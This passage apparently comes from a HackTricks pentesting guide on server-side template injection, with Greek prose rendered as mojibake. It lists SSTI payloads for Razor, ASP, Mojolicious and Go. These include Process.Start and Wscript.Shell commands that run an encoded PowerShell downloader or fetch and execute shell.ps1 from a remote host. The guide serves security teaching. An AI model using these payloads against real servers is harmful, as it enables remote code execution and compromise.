* `@() <= Î•Ï€Î¹Ï„Ï…Ï‡Î¯Î±`
* `@("{{code}}") <= Î•Ï€Î¹Ï„Ï…Ï‡Î¯Î±`
* `@ <= Î•Ï€Î¹Ï„Ï…Ï‡Î¯Î±`
* `@{} <= Î£Î¦Î‘Î›ÎœÎ‘!`
* `@{ <= Î£Î¦Î‘Î›ÎœÎ‘!`
* `@(1+2)`
* `@( //C#Code )`
* `@System.Diagnostics.Process.Start("cmd.exe","/c echo RCE > C:/Windows/Tasks/test.txt");`
* `@System.Diagnostics.Process.Start("cmd.exe","/c powershell.exe -enc IABpAHcAcgAgAC0AdQByAGkAIABoAHQAdABwADoALwAvADEAOQAyAC4AMQA2ADgALgAyAC4MQAxADEALwB0AGUAcwB0AG0AZQB0ADYANAAuAGUAeABlACAALQBPAHUAdABGAGkAbABlACAAQwA6AFwAVwBpAG4AZABvAHcAcwBcAFQAYQBzAGsAcwBcAHQAZQBzAHQAbQBlAHQANgA0AC4AZQB4AGUAOwAgAEMAOgBcAFcAaQBuAGQAbw3AHMAXABUAGEAcwBrAHMAXAB0AGUAcw0AZQB0ADYANAAuAGUAeABlAA==");`

Î— Î¼Î­Î¸Î¿Î´Î¿Ï‚ `.NET` `System.Diagnostics.Process.Start` Î¼Ï€Î¿ÏÎµÎ¯ Î½Î± Ï‡ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹Î·Î¸ÎµÎ¯ Î³Î¹Î± Î½Î± Î¾ÎµÎºÎ¹Î½Î®ÏƒÎµÎ¹ Î¿Ï€Î¿Î¹Î±Î´Î®Ï€Î¿Ï„Îµ Î´Î¹ÎµÏÎ³Î±ÏƒÎ¯Î± ÏƒÏ„Î¿Î½ Î´Î¹Î±ÎºÎ¿Î¼Î¹ÏƒÏ„Î® ÎºÎ±Î¹ Î­Ï„ÏƒÎ¹ Î½Î± Î´Î·Î¼Î¹Î¿Ï…ÏÎ³Î®ÏƒÎµÎ¹ Î­Î½Î± webshell. ÎœÏ€Î¿ÏÎµÎ¯Ï„Îµ Î½Î± Î²ÏÎµÎ¯Ï„Îµ Î­Î½Î± Ï€Î±ÏÎ¬Î´ÎµÎ¹Î³Î¼Î± ÎµÏ…Ï€Î±Î¸Î¿ÏÏ‚ webapp ÏƒÏ„Î¿ [https://github.com/cnotin/RazorVulnerableApp](https://github.com/cnotin/RazorVulnerableApp)

**Î ÎµÏÎ¹ÏƒÏƒÏŒÏ„ÎµÏÎµÏ‚ Ï€Î»Î·ÏÎ¿Ï†Î¿ÏÎ¯ÎµÏ‚**

* [https://clement.notin.org/blog/2020/04/15/Server-Side-Template-Injection-(SSTI)-in-ASP.NET-Razor/](https://clement.notin.org/blog/2020/04/15/Server-Side-Template-Injection-\(SSTI\)-in-ASP.NET-Razor/)
* [https://www.schtech.co.uk/razor-pages-ssti-rce/](https://www.schtech.co.uk/razor-pages-ssti-rce/)

### ASP

* `<%= 7*7 %>` = 49
* `<%= "foo" %>` = foo
* `<%= foo %>` = Î¤Î¯Ï€Î¿Ï„Î±
* `<%= response.write(date()) %>` = \<Date>
```xml
<%= CreateObject("Wscript.Shell").exec("powershell IEX(New-Object Net.WebClient).downloadString('http://10.10.14.11:8000/shell.ps1')").StdOut.ReadAll() %>
```
**Î ÎµÏÎ¹ÏƒÏƒÏŒÏ„ÎµÏÎµÏ‚ Î Î»Î·ÏÎ¿Ï†Î¿ÏÎ¯ÎµÏ‚**

* [https://www.w3schools.com/asp/asp\_examples.asp](https://www.w3schools.com/asp/asp\_examples.asp)

### Mojolicious (Perl)

Î‘ÎºÏŒÎ¼Î± ÎºÎ¹ Î±Î½ ÎµÎ¯Î½Î±Î¹ perl Ï‡ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹ÎµÎ¯ ÎµÏ„Î¹ÎºÎ­Ï„ÎµÏ‚ ÏŒÏ€Ï‰Ï‚ Ï„Î¿ ERB ÏƒÏ„Î· Ruby.

* `<%= 7*7 %> = 49`
* `<%= foobar %> = Î£Ï†Î¬Î»Î¼Î±`
```
<%= perl code %>
<% perl code %>
```
### SSTI ÏƒÏ„Î¿ GO

Î£Ï„Î· Î¼Î·Ï‡Î±Î½Î® Ï€ÏÎ¿Ï„ÏÏ€Ï‰Î½ Ï„Î¿Ï… Go, Î· ÎµÏ€Î¹Î²ÎµÎ²Î±Î¯Ï‰ÏƒÎ· Ï„Î·Ï‚ Ï‡ÏÎ®ÏƒÎ·Ï‚ Ï„Î·Ï‚ Î¼Ï€Î¿ÏÎµÎ¯ Î½Î± Î³Î¯Î½ÎµÎ¹ Î¼Îµ ÏƒÏ…Î³ÎºÎµÎºÏÎ¹Î¼Î­Î½Î± Ï†Î¿ÏÏ„Î¯Î±:

* `{{ . }}`: Î‘Ï€Î¿ÎºÎ±Î»ÏÏ€Ï„ÎµÎ¹ Ï„Î· Î´Î¿Î¼Î® Î´ÎµÎ´Î¿Î¼Î­Î½Ï‰Î½ ÎµÎ¹ÏƒÏŒÎ´Î¿Ï…. Î“Î¹Î± Ï€Î±ÏÎ¬Î´ÎµÎ¹Î³Î¼Î±, Î±Î½ Ï€ÎµÏÎ¬ÏƒÎµÎ¹ Î­Î½Î± Î±Î½Ï„Î¹ÎºÎµÎ¯Î¼ÎµÎ½Î¿ Î¼Îµ Î­Î½Î± Ï‡Î±ÏÎ±ÎºÏ„Î·ÏÎ¹ÏƒÏ„Î¹ÎºÏŒ `Password`, Ï„Î¿ `{{ .Password }}` Î¸Î± Î¼Ï€Î¿ÏÎ¿ÏÏƒÎµ Î½Î± Ï„Î¿ Î±Ï€Î¿ÎºÎ±Î»ÏÏˆÎµÎ¹.
* `{{printf "%s" "ssti" }}`: Î‘Î½Î±Î¼Î­Î½ÎµÏ„Î±Î¹ Î½Î± ÎµÎ¼Ï†Î±Î½Î¯ÏƒÎµÎ¹ Ï„Î· ÏƒÏ…Î¼Î²Î¿Î»Î¿ÏƒÎµÎ¹ÏÎ¬ "ssti".
* `{{html "ssti"}}`, `{{js "ssti"}}`: Î‘Ï…Ï„Î¬ Ï„Î± Ï†Î¿ÏÏ„Î¯Î± Î¸Î± Ï€ÏÎ­Ï€ÎµÎ¹ Î½Î± ÎµÏ€Î¹ÏƒÏ„ÏÎ­ÏˆÎ¿Ï…Î½ "ssti" Ï‡Ï‰ÏÎ¯Ï‚ Î½Î± Ï€ÏÎ¿ÏƒÎ¸Î­ÏƒÎ¿Ï…Î½ "html" Î® "js". Î ÎµÏÎ±Î¹Ï„Î­ÏÏ‰ Î¿Î´Î·Î³Î¯ÎµÏ‚ Î¼Ï€Î¿ÏÎ¿ÏÎ½ Î½Î± ÎµÎ¾ÎµÏÎµÏ…Î½Î·Î¸Î¿ÏÎ½ ÏƒÏ„Î·Î½ Ï„ÎµÎºÎ¼Î·ÏÎ¯Ï‰ÏƒÎ· Ï„Î¿Ï… Go [ÎµÎ´Ï](https://golang.org/pkg/text/template).

**Î•ÎºÎ¼ÎµÏ„Î¬Î»Î»ÎµÏ…ÏƒÎ· XSS**

ÎœÎµ Ï„Î¿ Ï€Î±ÎºÎ­Ï„Î¿ `text/template`, Ï„Î¿ XSS Î¼Ï€Î¿ÏÎµÎ¯ Î½Î± ÎµÎ¯Î½Î±Î¹ Î±Ï€Î»ÏŒ ÎµÎ¹ÏƒÎ¬Î³Î¿Î½Ï„Î±Ï‚ Ï„Î¿ Ï†Î¿ÏÏ„Î¯Î¿ Î±Ï€ÎµÏ…Î¸ÎµÎ¯Î±Ï‚. Î‘Î½Ï„Î¯Î¸ÎµÏ„Î±, Ï„Î¿ Ï€Î±ÎºÎ­Ï„Î¿ `html/template` ÎºÏ‰Î´Î¹ÎºÎ¿Ï€Î¿Î¹ÎµÎ¯ Ï„Î·Î½ Î±Ï€ÏŒÎºÏÎ¹ÏƒÎ· Î³Î¹Î± Î½Î± Ï„Î¿ Î±Ï€Î¿Ï„ÏÎ­ÏˆÎµÎ¹ Î±Ï…Ï„ÏŒ (Ï€.Ï‡., `{{"<script>alert(1)</script>"}}` Î¿Î´Î·Î³ÎµÎ¯ ÏƒÎµ `&lt;script&gt;alert(1)&lt;/script&gt;`). Î©ÏƒÏ„ÏŒÏƒÎ¿, Î¿ÏÎ¹ÏƒÎ¼ÏŒÏ‚ Ï€ÏÎ¿Ï„ÏÏ€Î¿Ï… ÎºÎ±Î¹ ÎºÎ»Î®ÏƒÎ· ÏƒÏ„Î¿ Go Î¼Ï€Î¿ÏÎµÎ¯ Î½Î± Ï€Î±ÏÎ±ÎºÎ¬Î¼ÏˆÎµÎ¹ Î±Ï…Ï„Î®Î½ Ï„Î·Î½ ÎºÏ‰Î´Î¹ÎºÎ¿Ï€Î¿Î¯Î·ÏƒÎ·: \{{define "T1"\}}alert(1)\{{end\}} \{{template "T1"\}}

vbnet Copy code

**Î•ÎºÎ¼ÎµÏ„Î¬Î»Î»ÎµÏ…ÏƒÎ· RCE**

Î— ÎµÎºÎ¼ÎµÏ„Î¬Î»Î»ÎµÏ…ÏƒÎ· RCE Î´Î¹Î±Ï†Î­ÏÎµÎ¹ ÏƒÎ·Î¼Î±Î½Ï„Î¹ÎºÎ¬ Î¼ÎµÏ„Î±Î¾Ï `html/template` ÎºÎ±Î¹ `text/template`. Î¤Î¿ Ï€ÏÏŒÏƒÎ¸ÎµÏ„Î¿ `text/template` ÎµÏ€Î¹Ï„ÏÎ­Ï€ÎµÎ¹ Ï„Î·Î½ ÎºÎ»Î®ÏƒÎ· Î¿Ï€Î¿Î¹Î±ÏƒÎ´Î®Ï€Î¿Ï„Îµ Î´Î·Î¼ÏŒÏƒÎ¹Î±Ï‚ ÏƒÏ…Î½Î¬ÏÏ„Î·ÏƒÎ·Ï‚ Î±Ï€ÎµÏ…Î¸ÎµÎ¯Î±Ï‚ (Ï‡ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹ÏÎ½Ï„Î±Ï‚ Ï„Î·Î½ Ï„Î¹Î¼Î® "call"), Ï€Î¿Ï… Î´ÎµÎ½ ÎµÏ€Î¹Ï„ÏÎ­Ï€ÎµÏ„Î±Î¹ ÏƒÏ„Î¿ `html/template`. Î— Ï„ÎµÎºÎ¼Î·ÏÎ¯Ï‰ÏƒÎ· Î³Î¹Î± Î±Ï…Ï„Î¬ Ï„Î± Ï€ÏÏŒÏƒÎ¸ÎµÏ„Î± ÎµÎ¯Î½Î±Î¹ Î´Î¹Î±Î¸Î­ÏƒÎ¹Î¼Î· [ÎµÎ´Ï Î³Î¹Î± Ï„Î¿ html/template](https://golang.org/pkg/html/template/) ÎºÎ±Î¹ [ÎµÎ´Ï Î³Î¹Î± Ï„Î¿ text/template](https://golang.org/pkg/text/template/).

Î“Î¹Î± RCE Î¼Î­ÏƒÏ‰ SSTI ÏƒÏ„Î¿ Go, Î¼Ï€Î¿ÏÎ¿ÏÎ½ Î½Î± ÎºÎ»Î·Î¸Î¿ÏÎ½ Î¼ÎµÎ¸ÏŒÎ´Î¿Î¹ Î±Î½Ï„Î¹ÎºÎµÎ¹Î¼Î­Î½Î¿Ï…. Î“Î¹Î± Ï€Î±ÏÎ¬Î´ÎµÎ¹Î³Î¼Î±, Î±Î½ Ï„Î¿ Ï€Î±ÏÎµÏ‡ÏŒÎ¼ÎµÎ½Î¿ Î±Î½Ï„Î¹ÎºÎµÎ¯Î¼ÎµÎ½Î¿ Î­Ï‡ÎµÎ¹ Î¼Î¹Î± Î¼Î­Î¸Î¿Î´Î¿ `System` Ï€Î¿Ï… ÎµÎºÏ„ÎµÎ»ÎµÎ¯ ÎµÎ½Ï„Î¿Î»Î­Ï‚, Î¼Ï€Î¿ÏÎµÎ¯ Î½Î± ÎµÎºÎ¼ÎµÏ„Î±Î»Î»ÎµÏ…Ï„ÎµÎ¯ Ï‰Ï‚ `{{ .System "ls" }}`. Î£Ï…Î½Î®Î¸Ï‰Ï‚ ÎµÎ¯Î½Î±Î¹ Î±Ï€Î±ÏÎ±Î¯Ï„Î·Ï„Î· Î· Ï€ÏÏŒÏƒÎ²Î±ÏƒÎ· ÏƒÏ„Î¿Î½ Ï€Î·Î³Î±Î¯Î¿ ÎºÏÎ´Î¹ÎºÎ± Î³Î¹Î± Î½Î± ÎµÎºÎ¼ÎµÏ„Î±Î»Î»ÎµÏ…Ï„ÎµÎ¯ Î±Ï…Ï„ÏŒ, ÏŒÏ€Ï‰Ï‚ ÏƒÏ„Î¿ Î´ÎµÎ´Î¿Î¼Î­Î½Î¿ Ï€Î±ÏÎ¬Î´ÎµÎ¹Î³Î¼Î±:
```go
func (p Person) Secret (test string) string {
out, _ := exec.Command(test).CombinedOutput()
return string(out)
}
```
**Î ÎµÏÎ¹ÏƒÏƒÏŒÏ„ÎµÏÎµÏ‚ Ï€Î»Î·ÏÎ¿Ï†Î¿ÏÎ¯ÎµÏ‚**

* [https://blog.takemyhand.xyz/2020/05/ssti-breaking-gos-template-engine-to.html](https://blog.takemyhand.xyz/2020/05/ssti-breaking-gos-template-engine-to.html)
* [https://www.onsecurity.io/blog/go-ssti-method-research/](https://www.onsecurity.io/blog/go-ssti-method-research/)

### Î ÎµÏÎ¹ÏƒÏƒÏŒÏ„ÎµÏÎµÏ‚ Î•ÎºÎ¼ÎµÏ„Î±Î»Î»ÎµÏÏƒÎµÎ¹Ï‚

Î•Î»Î­Î³Î¾Ï„Îµ Ï„Î¿ Ï…Ï€ÏŒÎ»Î¿Î¹Ï€Î¿ Ï„Î¿Ï… [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection) Î³Î¹Î± Ï€ÎµÏÎ¹ÏƒÏƒÏŒÏ„ÎµÏÎµÏ‚ ÎµÎºÎ¼ÎµÏ„Î±Î»Î»ÎµÏÏƒÎµÎ¹Ï‚. Î•Ï€Î¯ÏƒÎ·Ï‚, Î¼Ï€Î¿ÏÎµÎ¯Ï„Îµ Î½Î± Î²ÏÎµÎ¯Ï„Îµ ÎµÎ½Î´Î¹Î±Ï†Î­ÏÎ¿Ï…ÏƒÎµÏ‚ Ï€Î»Î·ÏÎ¿Ï†Î¿ÏÎ¯ÎµÏ‚ ÎµÏ„Î¹ÎºÎµÏ„ÏÎ½ ÏƒÏ„Î¿ [https://github.com/DiogoMRSilva/websitesVulnerableToSSTI](https://github.com/DiogoMRSilva/websitesVulnerableToSSTI)

## BlackHat PDF

{% file src="../../.gitbook/assets/en-server-side-template-injection-rce-for-the-modern-web-app-blackhat-15.pdf" %}

## Î£Ï‡ÎµÏ„Î¹ÎºÎ® Î’Î¿Î®Î¸ÎµÎ¹Î±

Î‘Î½ Ï€Î¹ÏƒÏ„ÎµÏÎµÏ„Îµ ÏŒÏ„Î¹ Î¸Î± Î¼Ï€Î¿ÏÎ¿ÏÏƒÎµ Î½Î± ÎµÎ¯Î½Î±Î¹ Ï‡ÏÎ®ÏƒÎ¹Î¼Î¿, Î´Î¹Î±Î²Î¬ÏƒÏ„Îµ:

* [ÎšÏŒÎ»Ï€Î± Flask](../../network-services-pentesting/pentesting-web/flask.md)
* [ÎœÎ±Î³Î¹ÎºÎ­Ï‚ ÏƒÏ…Î½Î±ÏÏ„Î®ÏƒÎµÎ¹Ï‚ Python](broken-reference/)

## Î•ÏÎ³Î±Î»ÎµÎ¯Î±

* [https://github.com/Hackmanit/TInjA](https://github.com/Hackmanit/TInjA)
* [https://github.com/vladko312/sstimap](https://github.com/vladko312/sstimap)
* [https://github.com/epinna/tplmap](https://github.com/epinna/tplmap)
* [https://github.com/Hackmanit/template-injection-table](https://github.com/Hackmanit/template-injection-table)

## Î›Î¯ÏƒÏ„Î± Î‘Î½Î¯Ï‡Î½ÎµÏ…ÏƒÎ·Ï‚ Î’Î¯Î±Ï‚

{% embed url="https://github.com/carlospolop/Auto_Wordlists/blob/main/wordlists/ssti.txt" %}

## Î ÏÎ±ÎºÏ„Î¹ÎºÎ® & Î‘Î½Î±Ï†Î¿ÏÎ­Ï‚

* [https://portswigger.net/web-security/server-side-template-injection/exploiting](https://portswigger.net/web-security/server-side-template-injection/exploiting)
* [https://github.com/DiogoMRSilva/websitesVulnerableToSSTI](https://github.com/DiogoMRSilva/websitesVulnerableToSSTI)
* [https://portswigger.net/web-security/server-side-template-injection](https://portswigger.net/web-security/server-side-template-injection)

<figure><img src="https://files.gitbook.com/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F-L_2uGJGU7AVNRcqRvEi%2Fuploads%2FelPCTwoecVdnsfjxCZtN%2Fimage.png?alt=media&#x26;token=9ee4ff3e-92dc-471c-abfe-1c25e446a6ed" alt=""><figcaption></figcaption></figure>

â€‹â€‹â€‹[**RootedCON**](https://www.rootedcon.com/) ÎµÎ¯Î½Î±Î¹ Ï„Î¿ Ï€Î¹Î¿ ÏƒÏ‡ÎµÏ„Î¹ÎºÏŒ ÏƒÏ…Î½Î­Î´ÏÎ¹Î¿ ÎºÏ…Î²ÎµÏÎ½Î¿Î±ÏƒÏ†Î¬Î»ÎµÎ¹Î±Ï‚ ÏƒÏ„Î·Î½ **Î™ÏƒÏ€Î±Î½Î¯Î±** ÎºÎ±Î¹ Î­Î½Î± Î±Ï€ÏŒ Ï„Î± Ï€Î¹Î¿ ÏƒÎ·Î¼Î±Î½Ï„Î¹ÎºÎ¬ ÏƒÏ„Î·Î½ **Î•Ï…ÏÏÏ€Î·**. ÎœÎµ **Î±Ï€Î¿ÏƒÏ„Î¿Î»Î® Ï„Î·Î½ Ï€ÏÎ¿ÏÎ¸Î·ÏƒÎ· Ï„Î·Ï‚ Ï„ÎµÏ‡Î½Î¹ÎºÎ®Ï‚ Î³Î½ÏÏƒÎ·Ï‚**, Î±Ï…Ï„ÏŒ Ï„Î¿ ÏƒÏ…Î½Î­Î´ÏÎ¹Î¿ Î±Ï€Î¿Ï„ÎµÎ»ÎµÎ¯ Î­Î½Î±Î½ Î¶Ï‰Î½Ï„Î±Î½ÏŒ ÏƒÎ·Î¼ÎµÎ¯Î¿ ÏƒÏ…Î½Î¬Î½Ï„Î·ÏƒÎ·Ï‚ Î³Î¹Î± ÎµÏ€Î±Î³Î³ÎµÎ»Î¼Î±Ï„Î¯ÎµÏ‚ Ï„ÎµÏ‡Î½Î¿Î»Î¿Î³Î¯Î±Ï‚ ÎºÎ±Î¹ ÎºÏ…Î²ÎµÏÎ½Î¿Î±ÏƒÏ†Î¬Î»ÎµÎ¹Î±Ï‚ ÏƒÎµ ÎºÎ¬Î¸Îµ Ï€ÎµÎ´Î¯Î¿.

{% embed url="https://www.rootedcon.com/" %}

<details>

<summary><strong>ÎœÎ¬Î¸ÎµÏ„Îµ Ï„Î¿ Ï‡Î¬ÎºÎ¹Î½Î³Îº AWS Î±Ï€ÏŒ Ï„Î¿ Î¼Î·Î´Î­Î½ Î¼Î­Ï‡ÏÎ¹ Ï„Î¿Î½ Î®ÏÏ‰Î± Î¼Îµ Ï„Î¿</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Î†Î»Î»Î¿Î¹ Ï„ÏÏŒÏ€Î¿Î¹ Ï…Ï€Î¿ÏƒÏ„Î®ÏÎ¹Î¾Î·Ï‚ Ï„Î¿Ï… HackTricks:

* Î‘Î½ Î¸Î­Î»ÎµÏ„Îµ Î½Î± Î´ÎµÎ¯Ï„Îµ Ï„Î·Î½ **ÎµÏ„Î±Î¹ÏÎµÎ¯Î± ÏƒÎ±Ï‚ Î´Î¹Î±Ï†Î·Î¼Î¹ÏƒÎ¼Î­Î½Î· ÏƒÏ„Î¿ HackTricks** Î® Î½Î± **ÎºÎ±Ï„ÎµÎ²Î¬ÏƒÎµÏ„Îµ Ï„Î¿ HackTricks ÏƒÎµ PDF** ÎµÎ»Î­Î³Î¾Ï„Îµ Ï„Î± [**Î£Î§Î•Î”Î™Î‘ Î£Î¥ÎÎ”Î¡ÎŸÎœÎ—Î£**](https://github.com/sponsors/carlospolop)!
* Î‘Ï€Î¿ÎºÏ„Î®ÏƒÏ„Îµ Ï„Î¿ [**ÎµÏ€Î¯ÏƒÎ·Î¼Î¿ PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Î‘Î½Î±ÎºÎ±Î»ÏÏˆÏ„Îµ [**Ï„Î·Î½ ÎŸÎ¹ÎºÎ¿Î³Î­Î½ÎµÎ¹Î± PEASS**](https://opensea.io/collection/the-peass-family), Ï„Î· ÏƒÏ…Î»Î»Î¿Î³Î® Î¼Î±Ï‚ Î±Ï€ÏŒ Î±Ï€Î¿ÎºÎ»ÎµÎ¹ÏƒÏ„Î¹ÎºÎ¬ [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Î•Î³Î³ÏÎ±Ï†ÎµÎ¯Ï„Îµ ÏƒÏ„Î·** ğŸ’¬ [**Î¿Î¼Î¬Î´Î± Discord**](https://discord.gg/hRep4RUj7f) Î® ÏƒÏ„Î· [**Î¿Î¼Î¬Î´Î± Ï„Î·Î»ÎµÎ³ÏÎ¬Ï†Î¿Ï…**](https://t.me/peass) Î® **Î±ÎºÎ¿Î»Î¿Ï…Î¸Î®ÏƒÏ„Îµ** Î¼Î±Ï‚ ÏƒÏ„Î¿ **Twitter** ğŸ¦ [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **ÎœÎ¿Î¹ÏÎ±ÏƒÏ„ÎµÎ¯Ï„Îµ Ï„Î± Ï‡Î¬ÎºÎ¹Î½Î³Îº ÎºÏŒÎ»Ï€Î± ÏƒÎ±Ï‚ Ï…Ï€Î¿Î²Î¬Î»Î»Î¿Î½Ï„Î±Ï‚ PRs ÏƒÏ„Î±** [**HackTricks**](https://github.com/carlospolop/hacktricks) ÎºÎ±Î¹ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) Î±Ï€Î¿Î¸ÎµÏ„Î®ÏÎ¹Î± ÏƒÏ„Î¿ GitHub.

</details>
